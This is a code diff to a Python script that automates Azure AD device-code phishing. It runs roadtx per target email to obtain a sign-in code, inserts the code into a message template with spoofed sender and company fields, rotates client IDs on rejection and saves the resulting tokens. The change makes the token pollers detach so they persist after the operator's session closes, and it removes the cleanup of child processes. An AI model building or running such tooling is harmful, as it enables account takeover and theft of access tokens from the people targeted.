@@ -16,7 +16,6 @@ REALITY NOTE — roadtx 1.22.1 flags, captured from the live binaries:
 """
 
 import argparse
-import atexit
 import csv
 import os
 import random
@@ -56,7 +55,7 @@ CODE_RE = re.compile(r"enter the code\s+([A-Z0-9]{9})", re.IGNORECASE)
 BAD_CLIENT = re.compile(r"invalid_client|AADSTS700016|Application with identifier", re.IGNORECASE)
 
 children = []
-atexit.register(lambda: [p.kill() for p in children if p.poll() is None])
+
 
 
 class Bucket:
@@ -80,47 +79,48 @@ class Bucket:
             time.sleep(wait)
 
 
-def drain(proc):
-    def run():
-        for _ in proc.stdout:
-            pass
-    t = threading.Thread(target=run, daemon=True)
-    t.start()
-    return t
-
-
 def get_code(uid, client_idx):
-    """Spawn roadtx, wait <=20s for a code. Returns (code, proc, client_idx)."""
+    """Spawn a detached roadtx poller, wait <=20s for a code.
+
+    Output goes to tokens/<uid>.log (not a pipe) and roadtx is started in its
+    own session on Linux, so the poller survives issue.py exiting or the SSH
+    session closing.
+    """
     path = os.path.join(HERE, "tokens", f"{uid}.json")
+    logpath = os.path.join(HERE, "tokens", f"{uid}.log")
     attempts = 0
     while attempts < 4:
         attempts += 1
         client = CLIENT_IDS[client_idx]
-        cmd = [
+        base = [
             ROADTX, "gettokens", "--device-code", "-c", client, "-t", "organizations",
             "-s", SCOPE, "-f", path,
         ]
+        cmd = base if os.name == "nt" else ["setsid"] + base
         print(f"  client {client}")
+        logf = open(logpath, "w")
         proc = subprocess.Popen(
-            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, bufsize=1, cwd=HERE,
+            cmd, stdout=logf, stderr=subprocess.STDOUT,
+            text=True, cwd=HERE,
             env={**os.environ, "PYTHONUNBUFFERED": "1"},
         )
+        logf.close()
         children.append(proc)
         deadline = time.time() + 20
-        seen = []
+        seen = ""
         while time.time() < deadline:
-            line = proc.stdout.readline()
-            if not line:
-                if proc.poll() is not None:
-                    break
+            time.sleep(0.2)
+            try:
+                with open(logpath, "r", errors="replace") as f:
+                    seen = f.read()
+            except OSError:
                 continue
-            seen.append(line)
-            print(f"  roadtx: {line.strip()[:200]}")
-            m = CODE_RE.search(line)
+            m = CODE_RE.search(seen)
             if m:
+                for line in seen.splitlines():
+                    print(f"  roadtx: {line.strip()[:200]}")
                 return m.group(1).upper(), proc, client_idx
-            if BAD_CLIENT.search(line):
+            if BAD_CLIENT.search(seen):
                 print(f"  invalid_client on {client} — rotating")
                 proc.kill()
                 client_idx = (client_idx + 1) % len(CLIENT_IDS)
@@ -129,8 +129,9 @@ def get_code(uid, client_idx):
             print(f"  code not seen within 20s on {client}")
         if proc.poll() is None:
             proc.kill()
-        if seen and not any(BAD_CLIENT.search(l) for l in seen) and not any(CODE_RE.search(l) for l in seen):
+        if seen and not BAD_CLIENT.search(seen) and not CODE_RE.search(seen):
             return None, proc, client_idx
+
 
 
 def render(template, code, sender, company):
@@ -226,7 +227,6 @@ def main():
             db.add_fail(email, "CODEGEN_FAIL", "no device code within 20s", domain)
             print("  CODEGEN_FAIL")
             continue
-        drain(proc)
         if args.variant == "ab":
             variant = "a" if variants % 2 == 0 else "b"
         else:
